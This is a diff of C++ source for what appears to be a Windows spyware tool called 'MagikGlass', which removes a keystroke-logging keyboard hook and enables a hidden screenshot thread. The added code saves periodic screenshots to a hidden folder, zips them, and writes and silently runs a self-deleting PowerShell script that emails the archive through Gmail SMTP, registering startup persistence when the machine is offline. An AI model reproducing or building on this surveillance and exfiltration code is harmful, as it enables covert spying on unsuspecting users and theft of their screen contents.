@@ -9,35 +9,6 @@
 #pragma warning( disable : 4477 )
 
 
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
-{
-    Log log;
-    BOOL fEatKeystroke = FALSE;
-
-    if (nCode == HC_ACTION)
-    {
-        if (wParam == WM_KEYDOWN){
-            //case WM_SYSKEYDOWN:
-            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
-            log.LogItInt(p->vkCode);
-        }
-    }
-    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
-}
-
-void InstallHook() {
-
-    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
-
-    // Keep this app running until we're told to stop
-    MSG msg;
-    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-
-}
-
 int main()
 {
 
@@ -87,7 +58,7 @@ int main()
     bool FirstLog = true;
 
     unsigned long ThreadId2;
-    //CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
+    CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
 
     //ShellExecuteA(0, "open", "cmd.exe", "/C powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass", 0, SW_HIDE);
 
@@ -500,162 +471,124 @@ int SilentlyRemoveDirectory(const char* dir) // Fully qualified name of the dire
     return ret; // returns 0 on success, non zero on failure.
 }
 
-PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
+
+void TakeScreenShot(const char* filename) {
+    int x1, y1, x2, y2, w, h;
+
+    // get screen dimensions
+    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    w = x2 - x1;
+    h = y2 - y1;
+
+    // copy screen to bitmap
+    HDC     hScreen = GetDC(NULL);
+    HDC     hDC = CreateCompatibleDC(hScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
+    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
+    BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
+
+    SaveHBITMAPToFile(hBitmap, filename);
+    //CLEAN
+    SelectObject(hDC, old_obj);
+    DeleteDC(hDC);
+    ReleaseDC(NULL, hScreen);
+    DeleteObject(hBitmap);
+};
+
+BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName)
 {
-    BITMAP bmp;
-    PBITMAPINFO pbmi;
-    WORD    cClrBits;
-
-    ZeroMemory(&bmp, sizeof(bmp));
-
-    // Retrieve the bitmap color format, width, and height.  
-    assert(GetObjectA(hBmp, sizeof(BITMAP), (LPSTR)&bmp));
-
-    // Convert the color format to a count of bits.  
-    cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
-    if (cClrBits == 1)
-        cClrBits = 1;
-    else if (cClrBits <= 4)
-        cClrBits = 4;
-    else if (cClrBits <= 8)
-        cClrBits = 8;
-    else if (cClrBits <= 16)
-        cClrBits = 16;
-    else if (cClrBits <= 24)
-        cClrBits = 24;
-    else cClrBits = 32;
-
-    // Allocate memory for the BITMAPINFO structure. (This structure  
-    // contains a BITMAPINFOHEADER structure and an array of RGBQUAD  
-    // data structures.)  
-
-    if (cClrBits < 24)
-        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
-            sizeof(BITMAPINFOHEADER) +
-            sizeof(RGBQUAD) * (1 << cClrBits));
-
-    // There is no RGBQUAD array for these formats: 24-bit-per-pixel or 32-bit-per-pixel 
-
-    else
-        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
-            sizeof(BITMAPINFOHEADER));
-
-    // Initialize the fields in the BITMAPINFO structure.  
-
-    pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
-    pbmi->bmiHeader.biWidth = bmp.bmWidth;
-    pbmi->bmiHeader.biHeight = bmp.bmHeight;
-    pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
-    pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
-    if (cClrBits < 24)
-        pbmi->bmiHeader.biClrUsed = (1 << cClrBits);
-
-    // If the bitmap is not compressed, set the BI_RGB flag.  
-    pbmi->bmiHeader.biCompression = BI_RGB;
-
-    // Compute the number of bytes in the array of color  
-    // indices and store the result in biSizeImage.  
-    // The width must be DWORD aligned unless the bitmap is RLE 
-    // compressed. 
-    pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8
-        * pbmi->bmiHeader.biHeight;
-    // Set biClrImportant to 0, indicating that all of the  
-    // device colors are important.  
-    pbmi->bmiHeader.biClrImportant = 0;
-    return pbmi;
-}
-
-void CreateBMPFile(LPCSTR pszFile, HBITMAP hBMP)
-{
-    HANDLE hf;
-    BITMAPFILEHEADER hdr;
-    PBITMAPINFOHEADER pbih;
-    LPBYTE lpBits;
-    DWORD dwTotal;
-    DWORD cb;
-    BYTE* hp;
-    PBITMAPINFO pbi;
+    std::string base64;
     HDC hDC;
-    hDC = CreateCompatibleDC(GetWindowDC(GetDesktopWindow()));
-    SelectObject(hDC, hBMP);
-    pbi = CreateBitmapInfoStruct(hBMP);
-    pbih = (PBITMAPINFOHEADER)pbi;
-    lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);
-    assert(lpBits);
-    assert(GetDIBits(hDC, hBMP, 0, (WORD)pbih->biHeight, lpBits, pbi, DIB_RGB_COLORS));
-    hf = CreateFileA(pszFile, GENERIC_READ | GENERIC_WRITE, (DWORD)0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
-    assert(hf != INVALID_HANDLE_VALUE);
-    hdr.bfType = 0x4d42;
-    hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
-    hdr.bfReserved1 = 0;
-    hdr.bfReserved2 = 0;
-    hdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD);
-    assert(WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER), (LPDWORD)&dwTmp, NULL));
-    assert(WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD), (LPDWORD)&dwTmp, (NULL)));
-    dwTotal = cb = pbih->biSizeImage;
-    hp = lpBits;
-    assert(WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL));
-    assert(CloseHandle(hf));
-    GlobalFree((HGLOBAL)lpBits);
+    int iBits;
+    WORD wBitCount;
+    DWORD dwPaletteSize = 0, dwBmBitsSize = 0, dwDIBSize = 0, dwWritten = 0;
+    BITMAP Bitmap0;
+    BITMAPFILEHEADER bmfHdr;
+    BITMAPINFOHEADER bi;
+    LPBITMAPINFOHEADER lpbi;
+    HANDLE fh, hDib, hPal, hOldPal2 = NULL;
+    hDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
+    iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
+    DeleteDC(hDC);
+    if (iBits <= 1)
+        wBitCount = 1;
+    else if (iBits <= 4)
+        wBitCount = 4;
+    else if (iBits <= 8)
+        wBitCount = 8;
+    else
+        wBitCount = 24;
+    GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
+    bi.biSize = sizeof(BITMAPINFOHEADER);
+    bi.biWidth = Bitmap0.bmWidth;
+    bi.biHeight = -Bitmap0.bmHeight;
+    bi.biPlanes = 1;
+    bi.biBitCount = wBitCount;
+    bi.biCompression = BI_RGB;
+    bi.biSizeImage = 0;
+    bi.biXPelsPerMeter = 0;
+    bi.biYPelsPerMeter = 0;
+    bi.biClrImportant = 0;
+    bi.biClrUsed = 256;
+    dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8
+        * Bitmap0.bmHeight;
+    hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
+    lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
+    *lpbi = bi;
+
+    hPal = GetStockObject(DEFAULT_PALETTE);
+    if (hPal)
+    {
+        hDC = GetDC(NULL);
+        hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
+        RealizePalette(hDC);
+    }
+
+
+    GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER)
+        + dwPaletteSize, (BITMAPINFO*)lpbi, DIB_RGB_COLORS);
+
+    if (hOldPal2)
+    {
+        SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
+        RealizePalette(hDC);
+        ReleaseDC(NULL, hDC);
+    }
+
+      fh = CreateFile(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+
+        if (fh == INVALID_HANDLE_VALUE)
+            return FALSE;
+    
+    bmfHdr.bfType = 0x4D42; // "BM"
+    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
+    bmfHdr.bfSize = dwDIBSize;
+    bmfHdr.bfReserved1 = 0;
+    bmfHdr.bfReserved2 = 0;
+    bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
+    /*
+        base64.append("<img src=\"data:image/jpeg;base64,");
+        base64.append((LPSTR)&bmfHdr);
+        base64.append((LPSTR)&lpbi);
+        cout<< base64;
+    */
+     WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
+
+        WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);
+    
+    GlobalUnlock(hDib);
+    GlobalFree(hDib);
+    CloseHandle(fh);
+    return TRUE;
 }
 
-BOOL WINAPI SaveBitmap(std::string wPath)
-{
-    BITMAPFILEHEADER bfHeader;
-    BITMAPINFOHEADER biHeader;
-    BITMAPINFO bInfo;
-    HGDIOBJ hTempBitmap;
-    HBITMAP hBitmap;
-    BITMAP bAllDesktops;
-    HDC hDC, hMemDC;
-    LONG lWidth, lHeight;
-    BYTE* bBits = NULL;
-    HANDLE hHeap = GetProcessHeap();
-    DWORD cbBits, dwWritten = 0;
-    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
-    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
-
-    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
-    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
-    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
-    ZeroMemory(&bAllDesktops, sizeof(BITMAP));
-
-    hDC = GetDC(NULL);
-    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
-    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
-
-    lWidth = bAllDesktops.bmWidth;
-    lHeight = bAllDesktops.bmHeight;
-
-    DeleteObject(hTempBitmap);
-
-    bfHeader.bfType = (WORD)('B' | ('M' << 8));
-    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
-    biHeader.biSize = sizeof(BITMAPINFOHEADER);
-    biHeader.biBitCount = 24;
-    biHeader.biCompression = BI_RGB;
-    biHeader.biPlanes = 1;
-    biHeader.biWidth = lWidth;
-    biHeader.biHeight = lHeight;
-
-    bInfo.bmiHeader = biHeader;
-
-    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;
-
-    hMemDC = CreateCompatibleDC(hDC);
-    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
-    SelectObject(hMemDC, hBitmap);
-    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
-
-    CreateBMPFile(wPath.c_str(), hBitmap);
-    return true;
-}
 
 
-
-
-
-/*ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
+ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
 
     char* AppData = nullptr;
     DWORD Size = MAX_LENGTH + 1;
@@ -671,17 +604,19 @@ BOOL WINAPI SaveBitmap(std::string wPath)
     DWORD DWFlags;
 
     while (1) {
+        SilentlyRemoveDirectory(ScreenshotDir.c_str());
+        Sleep(60000);
         CreateDirectoryA(ScreenshotDir.c_str(), NULL);
         SetFileAttributesA(ScreenshotDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
-        for (int i = 0; i < 20; i++) {
+        for (int i = 0; i < ScreenshotsPerZip; i++) {
             CurrentLog = ScreenshotDir;
             CurrentLog += "\\ScreenShot";
             CurrentLog += std::to_string(rand() % 10000 - 1000);
-            CurrentLog += ".bmp";
+            CurrentLog += ".png";
 
-            SaveBitmap(CurrentLog.c_str());
+            TakeScreenShot(CurrentLog.c_str());
 
-            Sleep(SecondsBetweenScreenshots);
+            Sleep(SecondsBetweenScreenshots*1000);
         }
         std::string ZipPath = ScreenshotDir;
         ZipPath += "\\Zip";
@@ -706,15 +641,49 @@ BOOL WINAPI SaveBitmap(std::string wPath)
             //SetUploadTask(Emailer, ZipPath);
         }
         else {
-            SendLog(ZipPath);
+            std::string Command = "/C powershell ";
+            char SysDir[MAX_PATH];
+            GetSystemDirectoryA(SysDir, MAX_PATH);
+            DWORD WrittenBytes, DWFlags;
+            char* AppData = nullptr;
+            size_t AppDataSize;
+            strcat_s(SysDir, MAX_PATH, "\\cmd.exe");
+            _dupenv_s(&AppData, &AppDataSize, "APPDATA");
+            std::string Powershell = AppData;
+            Powershell += "\\MagikGlass\\PSScript";
+            Powershell += std::to_string(GetTickCount());
+            Powershell += ".PS1";
+            std::string PSStartup = "MagikMailer";
+            PSStartup += std::to_string(GetTickCount());
+            HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            std::string a = "$online = test-connection 8.8.8.8 -Count 1 -Quiet\nif ($online)\n{\n$SMTPServer = 'smtp.gmail.com'\n$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n$SMTPInfo.EnableSsl = $true\n$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('";
+            a += SendersEmail;
+            a += "', '";
+            a += SendersPsw;
+            a += "')\n$ReportEmail = New-Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
+            a += SendersEmail;
+            a += "'\n$ReportEmail.To.Add('";
+            a += RecieversEmail;
+            a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
+            a += ZipPath.c_str();
+            a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
+            WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
+            CloseHandle(PS1File);
+            Command = "/C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
+            Command += Powershell;
+            Command += "\"";
+            if (!InternetGetConnectedState(&DWFlags, NULL)) {
+                RegisterMyProgramForStartup(PSStartup.c_str(), SysDir, Command.c_str());
+            }
+            else {
+                ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
+            }
         }
 
-        Sleep(60000);
-
-        SilentlyRemoveDirectory(ScreenshotDir.c_str());
+        Sleep(140000);
 
     }
-}*/
+}
 
 int CalculateDirSize(std::string DirectoryToCheck) {
 
